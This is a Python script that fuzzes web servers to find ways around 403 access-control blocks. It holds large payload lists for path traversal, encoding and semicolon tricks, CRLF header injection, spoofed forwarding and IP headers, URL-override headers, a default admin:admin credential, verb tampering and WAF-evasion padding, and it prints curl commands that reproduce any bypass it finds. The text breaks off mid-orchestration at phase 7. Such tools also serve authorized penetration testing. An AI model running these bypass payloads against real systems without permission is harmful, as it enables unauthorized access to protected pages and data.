#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
import json
import hashlib
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------
BASELINE = {}
RESULTS = []

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

BYPASS_USER_AGENTS = [
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Twitterbot/1.0',
    'curl/7.68.0',
    'Wget/1.21',
    'python-requests/2.28.0',
    '',
]

IP_SPOOFING_VALUES = [
    '127.0.0.1',
    'localhost',
    '127.1',
    '127.0.1',
    '0.0.0.0',
    '0',
    '::1',
    '::ffff:127.0.0.1',
    '0000::1',
    '10.0.0.0',
    '10.0.0.1',
    '172.16.0.0',
    '172.16.0.1',
    '192.168.0.1',
    '192.168.1.1',
    '192.168.1.0',
    # Encoded 127.0.0.1 variants
    '0177.0.0.1',           # Octal
    '2130706433',            # Decimal
    '0x7f000001',            # Hex
    '0x7f.0x0.0x0.0x1',     # Hex dotted
    '127.0.0.1:80',
    '127.0.0.1:443',
    'localhost:80',
    'localhost:443',
]

IP_SPOOFING_HEADERS = [
    'X-Forwarded-For',
    'X-Originating-IP',
    'X-Real-IP',
    'X-Remote-IP',
    'X-Remote-Addr',
    'X-ProxyUser-Ip',
    'X-Originally-Forwarded-For',
    'X-Forward-For',
    'X-Forwarded-By',
    'X-Forwarded-Server',
    'X-Forwarded',
    'X-Forwarder-For',
    'X-Original-Remote-Addr',
    'X-Client-IP',
    'Client-IP',
    'True-Client-IP',
    'CF-Connecting-IP',
    'Fastly-Client-IP',
    'X-Cluster-Client-IP',
    'X-Azure-ClientIP',
    'X-Custom-IP-Authorization',
    'From',
    'Forwarded',
    'Real-Ip',
]

def random_user_agent():
    return random.choice(USER_AGENTS)

def parse_custom_headers(header_list):
    custom_headers = {}
    if not header_list:
        return custom_headers
    for header in header_list:
        if ':' in header:
            key, value = header.split(':', 1)
            custom_headers[key.strip()] = value.strip()
        else:
            print(f"{colors.YELLOW}[!] Invalid header format (ignored): {header}{colors.END}")
    return custom_headers

def format_url(base_url, path):
    base_url = base_url.rstrip('/')
    if not path:
        return base_url
    path = path.lstrip('/')
    return f"{base_url}/{path}"

def get_domain(url):
    return urlparse(url).netloc.split(':')[0]

def body_signature(response):
    body = response.content or b""
    return len(body), hashlib.sha1(body).hexdigest()

def safe_request(method, url, headers=None, timeout=8, max_retries=1, verbose=False,
                 data=None, allow_redirects=True):
    for attempt in range(max_retries + 1):
        try:
            r = requests.request(
                method.upper(),
                url,
                headers=headers,
                timeout=timeout,
                allow_redirects=allow_redirects,
                verify=False,
                data=data,
            )
            if r.status_code in (429, 503) and attempt < max_retries:
                wait = 2 ** attempt
                if verbose:
                    print(f"{colors.YELLOW}    Rate limited ({r.status_code}), backing off {wait}s{colors.END}")
                time.sleep(wait)
                continue
            return r
        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"{colors.RED}    Request error: {e}{colors.END}")
            if attempt >= max_retries:
                return None
            time.sleep(0.5)
    return None

def build_curl_command(method, url, headers, data=None):
    parts = [f"curl -k -X {method}"]
    if headers:
        for k, v in headers.items():
            if k == 'User-Agent':
                continue
            parts.append(f"-H '{k}: {v}'")
    if data:
        parts.append(f"-d '{data}'")
    parts.append(f"'{url}'")
    return ' '.join(parts)

# ---------------------------------------------------------------------------
# Baseline + bypass detection
# ---------------------------------------------------------------------------
def capture_baseline(url, path, custom_headers, verbose=False):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)

    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    if r is None:
        BASELINE[path or ""] = None
        return

    length, h = body_signature(r)
    BASELINE[path or ""] = {"status": r.status_code, "length": length, "hash": h}

    if verbose:
        print(f"{colors.BLUE}[*] Baseline {test_url} -> {r.status_code} ({length} bytes){colors.END}")

    # Also capture a 404 baseline for false positive detection
    rand_path = ''.join(random.choices(string.ascii_lowercase, k=12))
    r404 = safe_request("GET", format_url(url, rand_path), req_headers, verbose=verbose)
    if r404:
        length404, h404 = body_signature(r404)
        BASELINE["__404__"] = {"status": r404.status_code, "length": length404, "hash": h404}
        if verbose:
            print(f"{colors.BLUE}[*] 404 baseline -> {r404.status_code} ({length404} bytes){colors.END}")

def is_bypass(path, response):
    if response is None:
        return False
    code = response.status_code
    if code >= 400:
        return False
    if not (200 <= code < 400):
        return False

    base = BASELINE.get(path or "")
    if base is None:
        return 200 <= code < 400

    length, h = body_signature(response)

    # Same content as the 403 page = not a bypass
    if h == base["hash"]:
        return False
    if code == base["status"] and abs(length - base["length"]) < 32:
        return False

    # Check against 404 baseline to filter false positives (custom 404 pages that return 200)
    base404 = BASELINE.get("__404__")
    if base404 and h == base404["hash"]:
        return False
    if base404 and code == base404["status"] and abs(length - base404["length"]) < 32:
        return False

    return True

# ---------------------------------------------------------------------------
# Technique wordlists
# ---------------------------------------------------------------------------
PATH_MANIPULATION_TECHNIQUES = sorted(set([
    # Basic variations
    "{0}", "/{0}", "/{0}/", "{0}/", "{0}.",
    "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
    "./{0}/", "//{0}", "//{0}//", "//{0}///",
    "///{0}", "////{0}",

    # Dot-segment tricks
    "%2e/{0}", "%2f{0}/", "%2f{0}%2f",
    "{0}%2e", "/{0}/%2e/", "%2e%2e/{0}",
    "{0}/..", "{0}/../{0}",

    # Semicolon tricks (Tomcat / Spring / Java-based servers)
    "{0}..;/", "{0};/", "{0};", "{0};x",
    "{0};x/", "/{0};/", ";/{0}/", "/;//{0}/",
    "{0};assets/", "..;/{0}", "/..;/{0}",
    "{0}/..;/", "{0}/;/", "/{0}/;/",
    "{0};.css", "{0};.js", "{0};.png",
    "{0};foo=bar", "/{0};foo=bar/",

    # Null byte
    "{0}%00", "{0}%00.html", "{0}%00.json",
    "{0}%00.php", "..%00/{0}",
    "{0}..%00/", "{0}..%0d/",

    # URL-encoded separators
    "{0}%20", "{0}%09", "{0}%0a", "{0}%0d", "{0}%0d%0a",
    "{0}%23", "{0}%3f", "{0}%26", "{0}%2e",
    "{0}%20/", "{0}%09/",

    # File extension tricks
    "{0}.html", "{0}.php", "{0}.json", "{0}.xml",
    "{0}.css", "{0}.js", "{0}.txt", "{0}.ico",
    "{0}.png", "{0}.jpg", "{0}.gif", "{0}.svg",
    "{0}.wsdl", "{0}.wadl",

    # Query / fragment tricks
    "{0}?", "{0}??", "{0}???", "{0}?#",
    "{0}#", "{0}?anything=1", "{0}?debug=1",
    "{0}?testparam=true",

    # Traversal + path
    "{0}../", "{0}/*", "*{0}/",
    "{0}/*/", "{0}\\..\\.\\",
    "{0}%2e%2e%2f", "{0}.%2e/",
    "{0}..%2f", "{0}..%5c", "{0}..\\",
    "{0}..%ff/",

    # Junk prefix traversal
    "a/..%5c{0}", "x/..%5c{0}", "junk/..%5c{0}",
    "a/..\\{0}", "a/../{0}", "x/../{0}",
    "anything/../{0}", "static/../{0}",
    "images/../{0}", "assets/../{0}",
    "css/../{0}", "js/../{0}",
    "api/../{0}", "./{0}",

    # Fragment prefix
    "#/../{0}", "%23/../{0}", "#/{0}", "%23/{0}",

    # Unicode overlong encoding
    "{0}%c0%af", "{0}%e0%80%af",
    "%c0%af{0}", "%e0%80%af{0}",

    # Whitespace / NEL / NBSP trailing
    "{0}%a0", "{0}%85", "{0}%c2%a0",
    "{0}%c2%85",

    # Windows-specific
    "{0}::$DATA", "{0}::$INDEX_ALLOCATION",

    # Double slash combinations
    "{0}//.", "{0}////",
    "//{0}/./", "//{0}//",

    # Tab injection in path
    "{0}%09", "/%09{0}", "{0}/%09/",

    # Unicode fullwidth characters (bypass ASCII-only matching)
    "{0}%ef%bc%8f",  # Fullwidth solidus /
    "%ef%bc%8f{0}",
    "{0}%ef%bc%8f{0}",

    # Mixed encoding
    "%2f%2e%2e%2f{0}",
    "/%252e/{0}",       # Double-encoded dot
    "/%252e%252e/{0}",  # Double-encoded ..
    "%252f{0}",         # Double-encoded /

    # Random suffix to bust caching
    "{0}/.randomstring", "{0}%20assets%20/",
    "{0}%2e/assets", "/{0}/./",

    # Line feed / carriage return injection
    "{0}%0d%0aX-Injected:%20true",
    "{0}%0aX-Injected:%20true",
]))

BYPASS_HEADERS = [
    # --- IP spoofing headers (generated dynamically in test phase) ---

    # --- URL/Path override headers ---
    {"X-Original-URL": "/{path}"},
    {"X-Rewrite-URL": "/{path}"},
    {"X-Override-URL": "/{path}"},
    {"X-Forwarded-Path": "/{path}"},

    # --- Host manipulation ---
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    {"Host": "{domain}"},

    # --- Scheme/Protocol headers ---
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Ssl": "on"},
    {"X-Url-Scheme": "https"},

    # --- Port headers ---
    {"X-Forwarded-Port": "80"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Port": "4443"},
    {"X-Forwarded-Port": "8080"},
    {"X-Forwarded-Port": "8443"},

    # --- Misc headers that affect routing ---
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"Content-Length": "0"},
    {"Connection": "close, X-Forwarded-For"},

    # --- Destination / Proxy headers ---
    {"Destination": "/{path}"},
    {"Proxy": "127.0.0.1"},
    {"Proxy-Host": "127.0.0.1"},
    {"Proxy-Url": "http://{domain}/{path}"},

    # --- URL-based headers ---
    {"Base-Url": "http://127.0.0.1"},
    {"Http-Url": "/{path}"},
    {"Redirect": "/{path}"},
    {"Request-Uri": "/{path}"},
    {"Uri": "/{path}"},
    {"Url": "/{path}"},
    {"X-Proxy-Url": "/{path}"},
    {"X-Http-Host-Override": "localhost"},

    # --- Referer/Origin tricks ---
    {"Referer": "{target}/{path}"},
    {"Origin": "{target}"},
    {"Referer": "http://localhost/{path}"},
    {"Origin": "http://localhost"},

    # --- Content-Type tricks ---
    {"Content-Type": "application/json"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "text/plain"},

    # --- Accept tricks ---
    {"Accept": "application/json"},
    {"Accept": "text/html, application/json"},
    {"Accept": "*/*"},

    # --- Auth header tricks ---
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer "},

    # --- WAF evasion headers ---
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},

    # --- Profile / arbitrary URL ---
    {"Profile": "http://{domain}"},
    {"X-Arbitrary": "http://{domain}"},
    {"X-HTTP-DestinationURL": "http://{domain}/{path}"},

    # --- Cache / CDN bypass ---
    {"Cache-Control": "no-cache, no-store"},
    {"Pragma": "no-cache"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},  # Double hop

    # --- Transfer encoding ---
    {"Transfer-Encoding": "chunked"},
]

HTTP_METHODS = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "HEAD", "OPTIONS", "TRACE",
    "CONNECT", "PROPFIND", "MKCOL",
    "MOVE", "COPY", "LOCK", "UNLOCK",
    "PROPPATCH", "SEARCH",
    "DEBUG", "TRACK",
    # Made-up verbs (some servers fallback to GET for unknown methods)
    "GETS", "POSTS", "PUTS",
    "JEFF", "CATS",
]

HTTP_METHOD_CASE_VARIANTS = [
    "get", "Get", "gEt", "GEt", "geT",
    "post", "Post", "pOst", "POst",
    "put", "Put", "pUt",
    "patch", "Patch", "pAtch",
    "delete", "Delete",
    "head", "Head",
    "options", "Options",
]

# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------
def test_fuzzing(url, path=None, method="GET", headers=None, custom_headers=None,
                 verbose=False, data=None, note=None):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    if headers:
        processed = headers.copy()
        for k, v in processed.items():
            if v and isinstance(v, str):
                if "{domain}" in v:
                    processed[k] = v.replace("{domain}", get_domain(url))
                if "{target}" in v:
                    processed[k] = v.replace("{target}", url)
                if "{path}" in v:
                    processed[k] = v.replace("{path}", (path or "").lstrip('/'))
        req_headers.update(processed)

    if any(c.isspace() for c in method):
        return False, 0, None, None, None, None

    if verbose:
        print(f"{colors.BLUE}[*] {method} {test_url}{colors.END}")

    try:
        r = safe_request(method, test_url, req_headers, verbose=verbose, data=data)
    except ValueError:
        return False, 0, None, None, None, None

    if is_bypass(path, r):
        return True, r.status_code, method, req_headers, path, note
    return False, 0, None, None, None, None

def test_protocol_switch(url, path, custom_headers, verbose):
    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
    test_url = format_url(base_url, path) if path else base_url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    if verbose:
        print(f"{colors.BLUE}[*] Protocol switch: {test_url}{colors.END}")
    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    if is_bypass(path, r):
        return True, r.status_code, "GET", req_headers, path, test_url
    return False, 0, None, None, None, None

def test_root_header_override(url, path, custom_headers, verbose):
    if not path:
        return []
    eff = path if path.startswith('/') else f"/{path}"
    root_url = url.rstrip('/') + '/'
    results = []
    override_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path"]
    for header_name in override_headers:
        h = {"User-Agent": random_user_agent(), header_name: eff}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Root override GET / | {header_name}: {eff}{colors.END}")
        r = safe_request("GET", root_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            results.append((True, r.status_code, "GET", h, eff, root_url, header_name))
    return results

def test_method_override(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    override_headers = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-HTTP-Method": "GET"},
        {"X-Method-Override": "GET"},
        {"X-HTTP-Method-Override": "POST"},
        {"X-HTTP-Method-Override": "PUT"},
        {"X-HTTP-Method-Override": "PATCH"},
        {"X-HTTP-Method-Override": "DELETE"},
    ]
    results = []
    for oh in override_headers:
        for verb in ("POST", "PUT", "PATCH"):
            h = {"User-Agent": random_user_agent(), **oh}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] Method override: {verb} {test_url} | {oh}{colors.END}")
            r = safe_request(verb, test_url, h, verbose=verbose)
            if r and is_bypass(path, r):
                override_name = list(oh.keys())[0]
                override_val = list(oh.values())[0]
                results.append((True, r.status_code, verb, h, path,
                                f"{override_name}: {override_val}"))
    return results

def test_http_0_9(url, path, verbose):
    try:
        import socket
        parsed = urlparse(url)
        host = parsed.hostname
        is_https = url.startswith('https://')
        port = parsed.port or (443 if is_https else 80)
        eff = f"/{path.lstrip('/')}" if path else "/"

        if verbose:
            print(f"{colors.BLUE}[*] HTTP/0.9: {host}:{port}{eff}{colors.END}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        if is_https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        s.sendall(f"GET {eff}\r\n".encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
        except socket.timeout:
            pass
        s.close()

        if data and not data.startswith(b"HTTP/"):
            return True, 200, "HTTP/0.9", None, eff
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    HTTP/0.9 error: {e}{colors.END}")
    return False, 0, None, None, None

def test_http_1_0(url, path, custom_headers, verbose):
    try:
        import socket
        parsed = urlparse(url)
        host = parsed.hostname
        is_https = url.startswith('https://')
        port = parsed.port or (443 if is_https else 80)
        eff = f"/{path.lstrip('/')}" if path else "/"

        if verbose:
            print(f"{colors.BLUE}[*] HTTP/1.0: {host}:{port}{eff}{colors.END}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        if is_https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        request = f"GET {eff} HTTP/1.0\r\nHost: {host}\r\n"
        if custom_headers:
            for k, v in custom_headers.items():
                request += f"{k}: {v}\r\n"
        request += "\r\n"
        s.sendall(request.encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 16384:
                    break
        except socket.timeout:
            pass
        s.close()

        if data and data.startswith(b"HTTP/"):
            status_line = data.split(b"\r\n")[0].decode(errors='replace')
            parts = status_line.split()
            if len(parts) >= 2:
                status_code = int(parts[1])
                if 200 <= status_code < 400:
                    base = BASELINE.get(path or "")
                    if base and status_code != base["status"]:
                        return True, status_code, "HTTP/1.0", None, eff
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    HTTP/1.0 error: {e}{colors.END}")
    return False, 0, None, None, None

def test_user_agent_bypass(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for ua in BYPASS_USER_AGENTS:
        h = {"User-Agent": ua} if ua else {}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            ua_short = ua[:50] + "..." if len(ua) > 50 else (ua or "(empty)")
            print(f"{colors.BLUE}[*] UA bypass: {ua_short}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            ua_name = "Googlebot" if "Googlebot" in ua else \
                      "Bingbot" if "Bingbot" in ua else \
                      "Empty UA" if not ua else \
                      ua.split('/')[0] if '/' in ua else ua[:30]
            results.append((True, r.status_code, "GET", h, path,
                            f"User-Agent: {ua_name}"))
    return results

def test_ip_spoofing_headers(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for header_name in IP_SPOOFING_HEADERS:
        for ip_val in IP_SPOOFING_VALUES:
            h = {"User-Agent": random_user_agent(), header_name: ip_val}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] IP spoof: {header_name}: {ip_val}{colors.END}")
            r = safe_request("GET", test_url, h, verbose=verbose)
            if r and is_bypass(path, r):
                results.append((True, r.status_code, "GET", h, path,
                                f"{header_name}: {ip_val}"))
    return results

def test_method_with_body(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    results = []
    bodies = [
        ("application/json", '{}'),
        ("application/json", '{"admin":true}'),
        ("application/x-www-form-urlencoded", 'admin=true'),
        ("application/xml", '<root/>'),
    ]
    for content_type, body_data in bodies:
        for method in ("POST", "PUT", "PATCH"):
            h = {"User-Agent": random_user_agent(), "Content-Type": content_type}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] {method} + body ({content_type}): {test_url}{colors.END}")
            r = safe_request(method, test_url, h, verbose=verbose, data=body_data)
            if r and is_bypass(path, r):
                results.append((True, r.status_code, method, h, path,
                                f"{method} with {content_type} body"))
    return results

def test_host_header_bypass(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    host_values = [
        "localhost", "127.0.0.1", "::1", "0.0.0.0",
        get_domain(url) + ":80",
        get_domain(url) + ":443",
        get_domain(url) + ":8080",
        get_domain(url) + ":8443",
        get_domain(url) + ".",  # Trailing dot (FQDN)
        get_domain(url).upper(),
    ]
    for host_val in host_values:
        h = {"User-Agent": random_user_agent(), "Host": host_val}
        if custom_headers:
            for k, v in custom_headers.items():
                if k.lower() != 'host':
                    h[k] = v
        if verbose:
            print(f"{colors.BLUE}[*] Host: {host_val} | {test_url}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            results.append((True, r.status_code, "GET", h, path,
                            f"Host: {host_val}"))
    return results

def test_verb_case_variants(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for method in HTTP_METHOD_CASE_VARIANTS:
        h = {"User-Agent": random_user_agent()}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Verb case: {method} {test_url}{colors.END}")
        try:
            r = safe_request(method, test_url, h, verbose=verbose)
            if r and is_bypass(path, r):
                results.append((True, r.status_code, method, h, path,
                                f"Verb case variant: {method}"))
        except Exception:
            pass
    return results

def test_double_encoding_full_path(url, path, custom_headers, verbose):
    if not path:
        return []
    results = []
    eff = path.lstrip('/')
    # Double-encode every character
    double_encoded = ""
    for ch in eff:
        if ch == '/':
            double_encoded += "%252f"
        elif ch.isalnum():
            hex_val = format(ord(ch), '02x')
            double_encoded += f"%25{hex_val}"
        else:
            double_encoded += quote(quote(ch, safe=''), safe='')
    test_url = format_url(url, double_encoded)
    h = {"User-Agent": random_user_agent()}
    if custom_headers:
        h.update(custom_headers)
    if verbose:
        print(f"{colors.BLUE}[*] Double encode full path: {test_url}{colors.END}")
    r = safe_request("GET", test_url, h, verbose=verbose)
    if r and is_bypass(path, r):
        results.append((True, r.status_code, "GET", h, double_encoded,
                        "Full double-encoded path"))

    # Triple encode path
    triple_encoded = quote(quote(quote(eff, safe=''), safe=''), safe='')
    test_url2 = format_url(url, triple_encoded)
    if verbose:
        print(f"{colors.BLUE}[*] Triple encode full path: {test_url2}{colors.END}")
    r2 = safe_request("GET", test_url2, h, verbose=verbose)
    if r2 and is_bypass(path, r2):
        results.append((True, r2.status_code, "GET", h, triple_encoded,
                        "Full triple-encoded path"))

    return results

def test_header_combos(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    results = []
    combos = [
        {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost",
         "X-Real-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": f"/{path.lstrip('/')}"},
        {"X-Forwarded-For": "127.0.0.1", "X-Rewrite-URL": f"/{path.lstrip('/')}",
         "X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "::1", "X-Forwarded-Host": "localhost",
         "X-Original-URL": f"/{path.lstrip('/')}"},
        {"Host": "localhost", "X-Forwarded-For": "127.0.0.1",
         "X-Real-IP": "127.0.0.1", "X-Originating-IP": "127.0.0.1"},
    ]
    for combo in combos:
        h = {"User-Agent": random_user_agent()}
        h.update(combo)
        if custom_headers:
            for k, v in custom_headers.items():
                if k not in combo:
                    h[k] = v
        if verbose:
            combo_str = ', '.join(f'{k}: {v}' for k, v in combo.items())
            print(f"{colors.BLUE}[*] Header combo: {combo_str}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            combo_str = ' + '.join(combo.keys())
            results.append((True, r.status_code, "GET", h, path,
                            f"Header combo: {combo_str}"))
    return results

def test_waf_bypass(url, path, custom_headers, verbose):
    if not path:
        return []
    eff = path.lstrip('/')
    results = []
    base_url = url.rstrip('/')

    # Large header padding to overflow WAF inspection buffer
    padding = 'A' * 8000
    h = {"User-Agent": random_user_agent(), "X-Padding": padding}
    if custom_headers:
        h.update(custom_headers)
    test_url = format_url(url, eff)
    if verbose:
        print(f"{colors.BLUE}[*] WAF bypass: large header padding{colors.END}")
    r = safe_request("GET", test_url, h, verbose=verbose)
    if r and is_bypass(path, r):
        results.append((True, r.status_code, "GET", {"X-Padding": "(8000 A's)"}, eff,
                        "WAF bypass: large header padding"))

    # Cache buster parameters
    cache_busters = [
        f"{eff}?cb={random.randint(10000,99999)}",
        f"{eff}?_={int(time.time())}",
        f"{eff}?cachebust=true",
    ]
    for cb_path in cache_busters:
        h = {"User-Agent": random_user_agent(), "Cache-Control": "no-cache, no-store",
             "Pragma": "no-cache"}
        if custom_headers:
            h.update(custom_headers)
        test_url = format_url(url, cb_path)
        if verbose:
            print(f"{colors.BLUE}[*] Cache buster: {test_url}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            results.append((True, r.status_code, "GET", h, cb_path,
                            "Cache buster bypass"))

    # Path with URL-encoded tab between segments
    if '/' in eff:
        parts = eff.split('/')
        tabbed = '%09'.join(parts)
        test_url = format_url(url, tabbed)
        h = {"User-Agent": random_user_agent()}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Tab-separated path: {test_url}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            results.append((True, r.status_code, "GET", h, tabbed,
                            "Tab-separated path segments"))

    return results

# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
def print_status(url, status_code, method, headers, path, extra_note=None):
    full_url = format_url(url, path) if path else url
    print(f"\n{colors.GREEN}{colors.BOLD}[+] BYPASS FOUND{colors.END}")
    print(f"    {colors.CYAN}URL:{colors.END}    {full_url}")
    print(f"    {colors.CYAN}Method:{colors.END} {colors.BOLD}{method}{colors.END}")
    print(f"    {colors.CYAN}Status:{colors.END} {colors.BOLD}{status_code}{colors.END}")
    if extra_note:
        print(f"    {colors.CYAN}Note:{colors.END}   {colors.YELLOW}{extra_note}{colors.END}")
    if headers:
        custom_h = {k: v for k, v in headers.items() if k != 'User-Agent'}
        if custom_h:
            print(f"    {colors.CYAN}Headers:{colors.END}")
            for k, v in custom_h.items():
                display_v = v if len(str(v)) < 100 else str(v)[:100] + "..."
                print(f"      {k}: {display_v}")
    # Curl command for reproduction
    curl = build_curl_command(method, full_url, headers)
    print(f"    {colors.DIM}Reproduce: {curl}{colors.END}")
    print(f"    {'─' * 60}")

    RESULTS.append({
        "url": full_url,
        "method": method,
        "status": status_code,
        "headers": {k: v for k, v in (headers or {}).items() if k != 'User-Agent'},
        "note": extra_note,
        "curl": curl,
    })

def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)

# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
def run_tests(target_url, path, custom_headers=None, threads=20, verbose=False,
              skip_phases=None):
    eff_path = path if path is not None else ""
    skip = set(skip_phases or [])
    total_phases = 16
    phase = 0

    def phase_header(name):
        nonlocal phase
        phase += 1
        if name in skip:
            if verbose:
                print(f"\n{colors.DIM}[*] Phase {phase}/{total_phases}: {name} (skipped){colors.END}")
            return False
        print(f"\n{colors.BOLD}[*] Phase {phase}/{total_phases}: {name}{colors.END}")
        return True

    # 1. Baseline
    if phase_header("Baseline"):
        capture_baseline(target_url, eff_path, custom_headers, verbose)

    # 2. Protocol switch
    if phase_header("Protocol switch"):
        s, code, m, h, p, new_url = test_protocol_switch(target_url, eff_path, custom_headers, verbose)
        if s:
            print_status(new_url, code, m, h, "", extra_note="Protocol switch")

    # 3. HTTP/0.9
    if phase_header("HTTP/0.9"):
        s, code, m, h, p = test_http_0_9(target_url, eff_path, verbose)
        if s:
            print_status(target_url, code, m, h, p, extra_note="Raw HTTP/0.9 response")

    # 4. HTTP/1.0 downgrade
    if phase_header("HTTP/1.0 downgrade"):
        s, code, m, h, p = test_http_1_0(target_url, eff_path, custom_headers, verbose)
        if s:
            print_status(target_url, code, m, h, p, extra_note="HTTP/1.0 protocol downgrade")

    # 5. Root header override
    if eff_path and phase_header("Root header override"):
        for result in test_root_header_override(target_url, eff_path, custom_headers, verbose):
            found, code, m, h, matched_path, root_url, header_name = result
            if found:
                print_status(root_url, code, m, h, "",
                             extra_note=f"{header_name}: {matched_path} (sent to /)")

    # 6. HTTP methods
    if phase_header("HTTP methods"):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(test_fuzzing, target_url, eff_path, mth, None,
                                 custom_headers, verbose)
                       for mth in HTTP_METHODS if not any(c.isspace() for c in mth)]
            for f in as_completed(futures):
                try:
                    s, code, m, h, p, n = f.result()
                    if s:
                        print_status(target_url, code, m, h, p, extra_note=f"HTTP method: {m}")
                except Exception:
                    pass

    # 7. Verb case variants
